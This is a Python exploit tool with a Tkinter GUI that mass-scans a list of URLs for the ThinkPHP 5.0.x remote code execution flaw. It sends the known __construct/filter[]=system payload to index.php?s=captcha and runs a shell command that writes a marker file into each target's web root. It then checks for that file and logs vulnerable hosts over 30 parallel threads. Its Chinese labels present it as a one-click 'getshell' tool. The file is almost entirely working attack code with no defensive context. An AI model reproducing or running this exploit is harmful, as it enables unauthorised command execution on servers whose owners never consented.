import requests
import json
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def post_command(host):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        "server[REQUEST_METHOD]": "echo 202cb962ac59075b964b07152d234b70 > 11.php"
    }
    target = host + "/public/index.php?s=captcha"
    r = requests.post(target, data=data, headers=headers)
    return True
def md5_file_is_exist(host):
    rs = requests.get(host+"/public/11.php")
    if rs.status_code == 200 and "202cb962ac59075b964b07152d234b70" in rs.text:
        return True
def Thinkphp_5_0_x_gethell_exp(url):
    try:
        post_command(url)
        if md5_file_is_exist(url):
            pocurl = url + "/public/11.php"
            Thinkphp_5_0_x_gethell_text.insert(END,"【！！！！！！】存在漏洞的url：" + pocurl + "\n")
            Thinkphp_5_0_x_gethell_text.see(END)
            with open("存在Thinkphp 5.0.x通杀gethell的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Thinkphp_5_0_x_gethell_text.insert(END, "【×】不存在漏洞的url：" + url + "\n")
            Thinkphp_5_0_x_gethell_text.see(END)
    except Exception as err:
        Thinkphp_5_0_x_gethell_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Thinkphp_5_0_x_gethell_text.see(END)
def get_Thinkphp_5_0_x_gethell_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Thinkphp_5_0_x_gethell_gui():
    Thinkphp_5_0_x_gethell = tk.Tk()
    Thinkphp_5_0_x_gethell.geometry("910x450")
    Thinkphp_5_0_x_gethell.title("Thinkphp 5.0.x通杀gethell一把梭")
    Thinkphp_5_0_x_gethell.resizable(0, 0)
    Thinkphp_5_0_x_gethell.iconbitmap('logo.ico')
    global Thinkphp_5_0_x_gethell_text
    Thinkphp_5_0_x_gethell_text = scrolledtext.ScrolledText(Thinkphp_5_0_x_gethell,width=123, height=25)
    Thinkphp_5_0_x_gethell_text.grid(row=0, column=0, padx=10, pady=10)
    Thinkphp_5_0_x_gethell_text.see(END)
    addrs = get_Thinkphp_5_0_x_gethell_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Thinkphp_5_0_x_gethell_exp, addr)
    Thinkphp_5_0_x_gethell.mainloop()